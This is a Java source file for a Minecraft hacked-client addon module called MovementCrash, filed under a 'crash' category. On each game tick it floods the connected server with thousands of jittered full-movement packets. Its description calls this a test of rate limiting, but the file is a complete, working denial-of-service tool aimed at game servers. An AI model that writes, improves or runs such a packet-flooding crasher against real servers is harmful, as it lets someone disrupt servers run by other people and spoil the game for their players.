package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class MovementCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets").description("Packets per tick.")
        .defaultValue(2000).min(1).sliderMax(10000).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );

    private final Random random = new Random();

    public MovementCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "movement-crash",
            "Spams full move packets with jittered position/rotation. Tests movement packet rate limiting.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        Vec3d pos = mc.player.getEntityPos();
        for (int i = 0; i < packets.get(); i++) {
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                pos.x + jitter(1), pos.y + jitter(1), pos.z + jitter(1),
                (float) (random.nextDouble() * 90), (float) (random.nextDouble() * 180),
                true, false));
        }
    }

    private double jitter(double rad) {
        return random.nextDouble() * rad - (rad / 2);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
